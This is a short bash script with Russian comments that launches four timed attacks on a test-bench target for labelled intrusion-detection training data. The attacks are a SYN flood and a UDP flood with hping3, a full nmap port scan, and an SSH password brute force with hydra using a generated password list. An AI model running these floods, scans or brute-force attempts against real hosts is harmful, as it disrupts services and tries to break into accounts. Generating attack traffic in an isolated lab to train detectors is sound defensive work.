#!/usr/bin/env bash
# Четыре сценария атак ТЗ. Запуск ТОЛЬКО на ATTACKER внутри изолированного стенда.
#   ./run_attacks.sh                      # тестовый прогон: по 3 мин, паузы 9 мин
#   DUR=120 PAUSE=180 ./run_attacks.sh    # обучающий прогон
#   MODE=low DUR=120 PAUSE=180 JOURNAL=train_low.csv ./run_attacks.sh   # пониженная интенсивность
# Журнал запусков (время UTC) служит разметкой для обучения и оценки.
set -u
T=${TARGET:-100.64.10.20}; DUR=${DUR:-180}; PAUSE=${PAUSE:-540}; MODE=${MODE:-full}
J=${JOURNAL:-attacks_journal.csv}
[ -f "$J" ] || echo "kind,start,end,attacker,target" > "$J"
[ -s passwords_big.txt ] || seq -f "Passw0rd%05g" 1 20000 > passwords_big.txt
me=$(hostname -I | awk '{print $1}')
if [ "$MODE" = low ]; then RATE="-i u2000"; NMAP="-T3"; HT=1; else RATE="--flood"; NMAP="-T4"; HT=4; fi
run() {  # run <kind> <command...>
  local kind=$1; shift
  local s; s=$(date -u +%FT%T.%3NZ)
  echo "[$s] $kind: $*"
  timeout "$DUR" "$@" >/dev/null 2>&1
  echo "$kind,$s,$(date -u +%FT%T.%3NZ),$me,$T" >> "$J"
  echo "  done, pause ${PAUSE}s"; sleep "$PAUSE"
}
run SYN-flood  hping3 -S -p 80 $RATE "$T"
run UDP-flood  hping3 --udp -p 53 -d 512 $RATE "$T"
run Scan       nmap -sS $NMAP -p- -Pn "$T" 100.64.10.21
run Bruteforce hydra -t $HT -L users.txt -P passwords_big.txt ssh://"$T"
echo "журнал: $J"; cat "$J"
